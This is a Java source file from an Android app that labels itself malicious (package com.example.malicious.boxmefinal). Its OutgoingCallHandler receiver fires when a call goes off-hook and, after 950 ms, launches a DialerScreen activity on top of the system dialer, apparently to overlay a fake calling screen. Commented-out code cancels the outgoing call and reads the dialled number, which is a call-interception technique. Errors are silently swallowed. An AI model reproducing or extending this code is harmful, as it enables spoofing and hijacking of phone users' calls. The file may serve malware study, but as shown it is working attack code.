package com.example.malicious.boxmefinal; /**
 * Created by malicious on 8/1/15.
 */

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by malicious on 7/26/15.
 */
public class OutgoingCallHandler extends BroadcastReceiver {
    Context c;

    @Override
    public void onReceive(final Context context, final Intent intent) {

            String state;
//        final String res = intent.getStringExtra("Number");

        try {
            state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);


            if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {

//                TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//                telephony.listen(new PhoneStateListener() {
//                    @Override
//                    public void onCallStateChanged(int state, String incomingNumber) {
//                        super.onCallStateChanged(state, incomingNumber);
////                    System.out.println("incomingNumber : "+incomingNumber);
//                    }
//                }, PhoneStateListener.LISTEN_CALL_STATE);


                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        Intent i = new Intent(context, DialerScreen.class);
                        i.putExtras(intent);

                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        i.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        context.startActivity(i);
                    }
                }, 950);

            }

        } catch (Exception ex) {
            //Do Nothing
        }


//        c = context;
//
//        setResultData(null);
//        String phonenumber = getResultData();
//        if (phonenumber == null) {
//            phonenumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//        }
//        setResultData(phonenumber);
//        new Timer().schedule(new TimerTask() {
//            @Override
//            public void run() {
//
//                        Intent intentPhoneCall = new Intent(c, DialerScreen.class);
//                        intentPhoneCall.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
//                        intentPhoneCall.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                        c.startActivity(intentPhoneCall);
//                    }
//
//
//
//
//            }, 1000);


    }
}